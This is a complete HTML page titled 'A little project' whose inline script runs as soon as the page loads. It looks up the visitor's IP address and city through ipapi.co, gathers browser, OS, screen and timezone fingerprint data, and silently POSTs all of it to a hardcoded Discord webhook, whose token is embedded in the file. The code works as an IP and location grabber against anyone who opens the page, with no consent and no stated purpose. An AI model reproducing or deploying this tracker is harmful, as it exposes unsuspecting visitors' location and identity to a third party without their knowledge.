<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>something</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: white;
            color: black;
            line-height: 1.6;
        }
        .info {
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <h1>A little project</h1>
    <div id="info"></div>

    <script>
        // Function to send data to Discord webhook
        async function sendToWebhook(data) {
            const webhookUrl = "https://discord.com/api/webhooks/1324816056782422098/vqBAptOKrjuEIgw40DkRx7Wgd2lOI1cxu0rHIgOjl6aGd42BiJfsM8bMwK_6TKXjgpH-"; // Replace with your webhook URL
            try {
                await fetch(webhookUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        content: data,
                    }),
                });
            } catch (error) {
                console.error("Failed to send data to webhook:", error);
            }
        }

        // Function to gather system information
        async function gatherSystemInfo() {
            const ipData = await getIPData();
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const windowDimensions = `${window.innerWidth}x${window.innerHeight}`;
            const browser = navigator.userAgent;
            const operatingSystem = navigator.platform;
            const cpuCores = navigator.hardwareConcurrency;
            const touchscreenSupport = navigator.maxTouchPoints > 0 ? "Yes" : "No";
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const localTime = new Date().toString();
            const darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Enabled" : "Disabled";

            const info = `
                Screen Resolution: ${screenResolution}\n
                Window Dimensions: ${windowDimensions}\n
                Browser: ${browser}\n
                Operating System: ${operatingSystem}\n
                CPU Cores: ${cpuCores}\n
                Touchscreen Support: ${touchscreenSupport}\n
                Language: ${language}\n
                Timezone: ${timezone}\n
                Local Time: ${localTime}\n
                Dark Mode: ${darkMode}\n
                IP Address: ${ipData.ip}\n
                Country: ${ipData.country}\n
                City: ${ipData.city}\n
                Region: ${ipData.region}`;

            sendToWebhook(info); // Send to webhook

            displayInfo(info); // Display on page
        }

        // Function to get IP address and location data
        async function getIPData() {
            try {
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    city: data.city,
                    region: data.region,
                };
            } catch (error) {
                console.error("Failed to fetch IP data:", error);
                return {
                    ip: "Unavailable",
                    country: "Unavailable",
                    city: "Unavailable",
                    region: "Unavailable",
                };
            }
        }

        // Function to display info on the page
        function displayInfo(info) {
            const infoDiv = document.getElementById("info");
            info.split("\n").forEach(line => {
                if (line.trim()) {
                    const div = document.createElement("div");
                    div.className = "info";
                    div.textContent = line;
                    infoDiv.appendChild(div);
                }
            });
        }

        // Gather and display system info
        gatherSystemInfo();
    </script>
</body>
</html>
